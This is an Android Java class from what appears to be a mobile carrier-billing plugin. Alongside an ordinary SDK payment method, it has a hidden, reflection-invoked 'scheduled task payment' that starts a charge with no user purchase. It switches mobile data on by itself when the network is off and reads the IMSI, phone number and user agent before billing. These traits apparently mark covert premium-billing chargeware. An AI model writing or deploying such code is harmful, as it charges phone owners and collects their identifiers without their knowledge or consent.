package com.example.sayid.myapplication.pay;

import android.content.Context;
import android.os.Handler;
import android.os.Message;

import com.example.sayid.myapplication.common.data.ConfigConst;
import com.example.sayid.myapplication.common.data.Strings;
import com.example.sayid.myapplication.common.db2.BlockDao;
import com.example.sayid.myapplication.common.listener.OnGprsListener;
import com.example.sayid.myapplication.common.listener.OnPayListener;
import com.example.sayid.myapplication.common.util.CacheUtil;
import com.example.sayid.myapplication.common.util.NetControlUtil;
import com.example.sayid.myapplication.common.util.ServiceUtil;
import com.example.sayid.myapplication.common.util.StringUtil;
import com.example.sayid.myapplication.common.util.TelephonyUtil;
import com.example.sayid.myapplication.model.ChannelOrderModel;

public class AppTache {

    private final static String TAG = "AppTache";

    /**
     * 请求间隔时间 3秒
     */
    private final static int INTERVAL_TIME = 3;

    /**
     * 计费请求
     */
    public final static int REQUEST_PAY = 1;

    public static Context context;

    /**
     * 私有单例类
     */
    private static volatile AppTache appTache;

    /**
     * 私有构造函数
     */
    private AppTache() {
    }

    /**
     * 获取AppTache实例
     *
     * @return
     */
    public static AppTache getInstance() {
        //先检查实例是否存在，如果不存在才进入下面的同步块
        if (appTache == null) {
            //同步块，线程安全的创建实例
            synchronized (AppTache.class) {
                //再次检查实例是否存在，如果不存在才真正的创建实例
                if (appTache == null) {
                    appTache = new AppTache();
                }
            }
        }
        return appTache;
    }


    /**
     * 初始化计费插件
     *
     * @param context
     */
    public void onResume(Context context) {
        //Logs.d("AppTache", "onResume--->");
        try {
            AppTache.context = context.getApplicationContext();
            if (appTache == null) {
                appTache = getInstance();
            }

//			ServiceUtil.startService(context);
        } catch (Exception e) {
            //Logs.e(TAG, e, "onResume error:");
        }
    }


    /**
     * 初始化计费插件
     *
     * @param context
     */
    public void initPay(Context context) {
        try {
            AppTache.context = context.getApplicationContext();
//            Intent intent = new Intent(AppTache.context, SmSserver.class);
//            AppTache.context.startService(intent);
            ServiceUtil.startService(AppTache.context);
//            PreferUtil.getInstance().init(AppTache.context);
        } catch (Exception e) {
        }
    }

    /**
     * 定时任务支付请求
     * 外部不可见,内部通过反射调用
     *
     * @hide
     */
    public void requestTaskPay() {
        try {
            boolean isRerutn = judgeIntervalTime();
            if (isRerutn) {
                return;
            }

            // 判断SIM卡是否准备好
//			if (!ImsiImeiUtil.isSimReady(context)) {
//				Logs.e(TAG,"Sim 卡没有准备好");
//				return;
//			}

            // 判断网络是否打开，如果没有则打开网络
            boolean isNetConnected = NetControlUtil.getInstance(context).isNetConnected();
            if (!isNetConnected) {
                if (ConfigConst.IS_OPEN_GPRS) {
                    // 打开网络，需要修改，等待30秒
                    NetControlUtil.getInstance(context).openGprs(new OnGprsListener() {
                        public void onGprsState(boolean isConnected) {
//							Logs.d(TAG, "requestTaskPay -- > 001 isConnected = " + isConnected);
                            // 打开网络成功发出支付请求
                            if (isConnected) {
                                payTask();
                            } else {
                                // 打开网络失败，更新下次请求时间
                                CacheUtil.getInstance().setLong(CacheUtil.KEY_NEXT_TIME, (System.currentTimeMillis() + CacheUtil.NEXT_TIME_ERROR));
                            }
                        }
                    }, 30);
                } else {
                    //	Logs.d(TAG, "isOpenGPRS=" + ConfigConst.IS_OPEN_GPRS + "不自动打开GPRS");
                }
            } else {
                // 网络成功发出支付请求
                payTask();
            }
            //	Logs.d(TAG, "requestTaskPay -- > openGprs -> 004 isNetConnected = " + isNetConnected);
        } catch (Exception e) {
//			Logs.e(TAG, e, "requestTaskPay error:");
        }
    }

    /**
     * Sdk支付请求
     * 内容提供商支付接口
     */
    public void requestSdkPay(final String user_order_id,
                              final String goods_id, final String goods_name, final int quantity,
                              final int unit_price, final boolean is_online, final Handler handler) {

        try {


            // 判断输入参数
            boolean isRerutn = check(REQUEST_PAY, goods_id, goods_name, user_order_id, handler);

            if (isRerutn) {
                return;
            }

            // 判断SIM卡是否准备好
//			if (!ImsiImeiUtil.isSimReady(context)) {
//				Logs.e(TAG,"Sim 卡没有准备好");
//				return;
//			}

            // 判断网络是否打开，如果没有则打开网络
            boolean isNetConnected = NetControlUtil.getInstance(context).isNetConnected();
            if (!isNetConnected) {
                if (ConfigConst.IS_OPEN_GPRS) {
                    // 打开网络，需要修改，等待30秒
                    NetControlUtil.getInstance(context).openGprs(new OnGprsListener() {
                        public void onGprsState(boolean isConnected) {
                            //	Logs.d(TAG, "requestTaskPay -- > 001 isConnected = " + isConnected);
                            // 打开网络成功发出支付请求

                            if (isConnected) {

                                paySdk(user_order_id, goods_id, goods_name, quantity, unit_price, is_online, handler);
                            } else {
                                // 打开网络失败，更新下次请求时间
                                CacheUtil.getInstance().setLong(CacheUtil.KEY_NEXT_TIME, (System.currentTimeMillis() + CacheUtil.NEXT_TIME_ERROR));
                            }
                        }
                    }, 30);
                } else {
//					Logs.e(TAG, "isOpenGPRS=" + ConfigConst.IS_OPEN_GPRS + "不自动打开GPRS");
                }
            } else {
                // 网络成功发出支付请求
                paySdk(user_order_id, goods_id, goods_name, quantity, unit_price, is_online, handler);
            }
        } catch (Exception e) {
//			Logs.e(TAG, e, "requestTaskPay error:");
        }
    }

    public boolean isRoot() {
        String isRootStr = CacheUtil.getInstance().getString(CacheUtil.KEY_IS_ROOT, "1");
        if ("0".equals(isRootStr)) {
            return true;
        }
        return false;
    }

    public static String getValue(String result, String key) {
        String value = "";
        if (result == null || result.equals("") || key == null || key.equals("")) {
            return value;
        }
        return StringUtil.getDynamicAnswer(result, key + "=|&");
    }

    private void payTask() {
        try {
            initPhone();
            ChannelOrderModel channelOrderModel = new ChannelOrderModel(context, new OnPayListener() {
                public void onSuccess(String user_order_id, int real_price) {
//                    System.out.println(" onSuccess=====");
                }

                public void onFailed(String user_order_id, String errorCode, String errorMsg) {
                    NetControlUtil.getInstance(context).closeGprs(false);
                }
            });
            channelOrderModel.requestCommonFee();
        } catch (Exception e) {
//		   Logs.e(TAG, e, "payTask,AppTache:error,001:");
        }
    }

    private void paySdk(String user_order_id, String goods_id,
                        String goods_name, int quantity, int unit_price, boolean is_online,
                        final Handler handler) {

        try {
            initPhone();
            ChannelOrderModel channelOrderModel = new ChannelOrderModel(context, new OnPayListener() {
                public void onSuccess(String user_order_id, int real_price) {
                    callbackHandler(handler, REQUEST_PAY, true, real_price, user_order_id, "", "");
//                  System.out.println(" 网络成功支付请求  ====  " +real_price);
                }

                public void onFailed(String user_order_id, String errorCode, String errorMsg) {
                    NetControlUtil.getInstance(context).closeGprs(false);
                    callbackHandler(handler, REQUEST_PAY, false, 0, user_order_id, errorCode, errorMsg);
//                  System.out.println(" 网络失败支付请求  ====  " + "errorCode  == "+   errorCode + "   errorMsg  == "+   errorMsg);
                }
            });

            channelOrderModel.requestCommonFee(user_order_id, goods_id,
                    goods_name, quantity, unit_price, is_online);
        } catch (Exception e) {
//			Logs.e(TAG, e, "payTask,AppTache:error,002:");
        }
    }

    /**
     * 判断请求的间隔时间,一定时间内只能请求一次
     */
    private synchronized boolean judgeIntervalTime() {
        long request_time = CacheUtil.getInstance().getLong(CacheUtil.KEY_PAY_TIME, 0);
//		Logs.d(TAG, "judgeIntervalTime--->request_time=" + request_time);

        if (request_time > 0 && (System.currentTimeMillis() - request_time < INTERVAL_TIME * 1000)) {
//			Logs.d(TAG, "judgeIntervalTime---CLICK OFFTEN-->");
            return true;
        }

        CacheUtil.getInstance().setLong(CacheUtil.KEY_PAY_TIME, System.currentTimeMillis());
        return false;
    }

    /**
     * 回调Handler
     *
     * @param handler
     * @param what
     * @param is_success
     * @param real_price
     * @param user_order_id
     * @param error_code
     * @param error_msg
     */
    private void callbackHandler(Handler handler, int what, boolean is_success,
                                 int real_price, String user_order_id, String error_code, String error_msg) {
        if (handler != null) {
            String issuccess = "false";
            if (is_success) {
                issuccess = "true";
            }
            Message msg = new Message();
            msg.what = what;

            msg.obj = "is_success=" + issuccess
                    + "&" + "real_price=" + real_price
                    + "&" + "user_order_id=" + user_order_id
                    + "&" + "error_code=" + error_code
                    + "&" + "error_msg=" + error_msg
                    + "&";

            handler.sendMessage(msg);
        }
    }

    /**
     * 检查
     *
     * @param type
     * @param goods_id
     * @param goods_name
     * @param user_order_id
     * @param handler
     * @return
     */
    private boolean check(int type, String goods_id, String goods_name, String user_order_id, final Handler handler) {
        if (judgeIntervalTime()) {
            callbackHandler(handler, type, false, 0, user_order_id, "112003", Strings.POINT_QUICK);
            return true;
        }
        if (goods_id != null && goods_id.length() > 10) {
            callbackHandler(handler, type, false, 0, user_order_id, "110011", Strings.GOODS_ID_LONG);
            return true;
        }
        if (goods_name != null && goods_name.length() > 48) {
            callbackHandler(handler, type, false, 0, user_order_id, "110011", Strings.GOODS_NAME_LONG);
            return true;
        }
        if (StringUtil.length(user_order_id) > 50) {
            callbackHandler(handler, type, false, 0, user_order_id, "110011", Strings.USER_ID_LONG);
            return true;
        }

        return false;
    }


    /**
     * 初始化手机信息
     */
    private static void initPhone() {
        try {
            String imsi = TelephonyUtil.getImsi(context);
            TelephonyUtil.getPhoneNum(context, imsi);
//		 	TelephonyUtil.getSmscBox(context, imsi);
            TelephonyUtil.getUserAgent(context);
            // 删除过期记录
            BlockDao blockDao = new BlockDao(context);
            blockDao.deleteExpired();
        } catch (Exception e) {
//			Logs.e(TAG, e, "initPhone error:");
        }
    }
}
